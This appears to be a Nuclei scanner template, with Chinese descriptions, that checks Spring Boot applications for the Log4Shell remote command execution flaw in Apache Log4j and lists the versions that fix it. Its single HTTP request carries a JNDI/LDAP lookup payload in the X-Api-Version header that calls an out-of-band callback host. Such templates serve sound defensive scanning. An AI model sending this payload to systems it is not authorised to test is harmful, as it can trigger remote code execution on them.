id: springboot-log4j-rce

info:
  name: Spring Boot 远程命令执行 - (Apache Log4j)
  author: wintry
  severity: critical
  description: Spring Boot 使用了带漏洞版本的 Apache Log4j, 会导致远程命令执行漏洞.
  reference:
    - https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab
  remediation: |
    升级到以下Log4j版本
    2.3.1 (for Java 6)
    2.12.3 (for Java 7)
    2.17.0 (for Java 8 and later)
  tags: spring
  metadata:
    max-request: 1

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        X-Api-Version: ${jndi:ldap://{{interactsh}}/{{header}}}